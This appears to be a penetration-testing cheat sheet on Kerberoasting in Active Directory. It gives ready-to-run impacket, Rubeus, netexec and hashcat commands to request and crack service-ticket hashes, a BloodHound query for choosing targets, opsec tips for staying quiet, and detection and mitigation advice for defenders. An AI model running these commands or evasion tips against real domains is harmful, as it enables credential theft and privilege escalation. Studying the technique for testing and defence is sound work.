---
title: "Kerberoasting"
description: "Request TGS tickets for accounts with SPNs and crack them offline. No elevated privileges required — just a valid domain user."
category: "Active Directory"
tools: [impacket, hashcat, Rubeus, BloodHound]
updated: 2026-04-12
tags: [active-directory, kerberos, privesc, credential-access]
---

## What it is

Any authenticated domain user can request a service ticket (TGS) for any account that has a Service Principal Name set. The ticket is encrypted with the target account's password hash. Request the ticket, take it offline, crack it.

No elevated rights needed. This is why it is one of the most common privilege escalation paths in AD environments.

## Enumeration

Find kerberoastable accounts with Impacket:

```bash
impacket-GetUserSPNs DOMAIN/user:password -dc-ip 10.10.10.100 -request
```

The `-request` flag actually requests the tickets. Without it, you only see which accounts have SPNs.

With Rubeus from a Windows foothold:

```powershell
.\Rubeus.exe kerberoast /outfile:hashes.txt
```

With `netexec` (modern replacement for CrackMapExec):

```bash
netexec ldap 10.10.10.100 -u user -p password --kerberoasting hashes.txt
```

## Cracking

Hashcat mode `13100` for Kerberos 5 TGS-REP etype 23 (RC4):

```bash
hashcat -m 13100 hashes.txt /usr/share/wordlists/rockyou.txt
```

For AES-encrypted tickets (etype 17/18), use mode `19600` or `19700`. AES tickets are slower to crack and often not worth the effort if RC4 is available.

## Identifying high-value targets

Not every kerberoastable account is worth cracking. Prioritize:

- Accounts with `AdminCount=1` (former or current admins)
- Accounts running services on Domain Controllers
- Accounts whose name suggests a privileged role (`svc_sql`, `backup_admin`, etc)

BloodHound query:

```cypher
MATCH (u:User {hasspn:true})
RETURN u.name, u.admincount, u.serviceprincipalnames
ORDER BY u.admincount DESC
```

## OpSec

- **One ticket, one crack.** Requesting all tickets at once is loud. Request individually if you can afford the time.
- **TGS requests appear in Event ID 4769.** RC4 requests from a single source in a short window are a red flag.
- **Do not use `-request` on production without a plan.** The request itself is logged.

## Detection (for defenders)

- **Event ID 4769** with `Ticket Encryption Type = 0x17` (RC4). Legitimate modern environments almost always use AES.
- **Multiple distinct SPNs** requested by the same user in a short window.
- **Requests from hosts** that are not service accounts or known infrastructure.

## Mitigation

- **Remove SPNs from accounts that do not need them.** If the service is not running under that account anymore, delete the SPN.
- **Rotate service account passwords** to 25+ characters, ideally via Group Managed Service Accounts (gMSA).
- **Enable AES-only** on the domain and audit for RC4 fallback.
- **Monitor for RC4 TGS requests** as a high-signal alert.
